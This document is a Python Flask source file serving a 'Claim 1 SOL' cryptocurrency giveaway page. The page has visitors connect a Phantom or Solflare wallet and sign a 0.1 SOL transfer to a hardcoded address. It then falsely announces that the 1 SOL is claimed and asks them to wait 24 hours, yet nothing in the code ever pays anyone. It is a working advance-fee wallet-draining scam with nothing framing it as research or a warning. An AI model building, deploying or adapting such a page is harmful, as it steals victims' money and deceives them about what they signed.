from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    .button {
      background: linear-gradient(to right, #00ff90, #00d178);
      border: none;
      color: #000;
      font-weight: bold;
      padding: 14px 30px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin: 20px;
    }
    .button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    img.qr {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
      display: none;
    }
    #status {
      margin-top: 20px;
      color: #ccc;
      font-size: 0.9em;
      white-space: pre-wrap;
      min-height: 40px;
    }
  </style>
  <!-- Include Solana web3.js -->
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body>
  <h1>🎁 Claim 1 SOL</h1>
  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
  
  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
  <button class="button" id="claimBtn" disabled>🎉 Claim Now</button>
  <div id="status">Click "Connect Wallet" to begin.</div>

  <script>
    const status = document.getElementById("status");
    const qr = document.getElementById("qrCode");
    const connectBtn = document.getElementById("connectBtn");
    const claimBtn = document.getElementById("claimBtn");
    const WALLET_ADDRESS = "{{ wallet }}";

    let provider = null;
    let publicKey = null;

    function logStatus(msg) {
      console.log(msg);
      status.innerText = msg;
    }

    function detectProvider() {
      if (window.solana?.isPhantom) {
        return window.solana;
      }
      if (window.solflare?.isSolflare) {
        return window.solflare;
      }
      if (window.phantom?.solana?.isPhantom) {
        return window.phantom.solana;
      }
      return null;
    }

    connectBtn.addEventListener('click', async () => {
      logStatus("Detecting wallet provider...");
      provider = detectProvider();

      if (!provider) {
        logStatus("⚠️ No wallet detected. Please use Phantom or Solflare wallets.");
        qr.style.display = "block";
        return;
      }
      qr.style.display = "none";

      try {
        logStatus("Requesting connection from wallet...");
        const resp = await provider.connect();
        console.log("connect response:", resp);
        publicKey = resp?.publicKey || provider.publicKey;
        if (publicKey) {
          logStatus("✅ Connected wallet: " + publicKey.toString());
          claimBtn.disabled = false;
        } else {
          logStatus("Connected but no publicKey received.");
        }
      } catch (err) {
        console.error("Connection error:", err);
        if (err.code === 4001 || (err.message && err.message.toLowerCase().includes("rejected"))) {
          logStatus("❌ Connection rejected by user.");
        } else {
          logStatus("❌ Wallet connection failed or rejected.");
        }
      }
    });

    claimBtn.addEventListener('click', async () => {
      if (!provider || !publicKey) {
        logStatus("⚠️ Connect your wallet first.");
        return;
      }

      try {
        logStatus("⏳ Preparing transaction to send 0.1 SOL...");
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        const toPubkey = new solanaWeb3.PublicKey(WALLET_ADDRESS);

        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey,
            lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.1,
          })
        );

        transaction.feePayer = publicKey;
        const { blockhash } = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhash;

        logStatus("⏳ Awaiting signature approval in wallet...");
        const signedTransaction = await provider.signTransaction(transaction);

        logStatus("⏳ Sending transaction...");
        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
        logStatus("Transaction sent, signature: " + signature);

        await connection.confirmTransaction(signature, 'confirmed');
        logStatus("🎉 Transaction confirmed! You claimed 1 SOL.\nPlease wait 24h for processing.");
        claimBtn.disabled = true;
      } catch (err) {
        console.error("Transaction error:", err);
        logStatus("❌ Transaction failed: " + (err.message || err));
      }
    });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
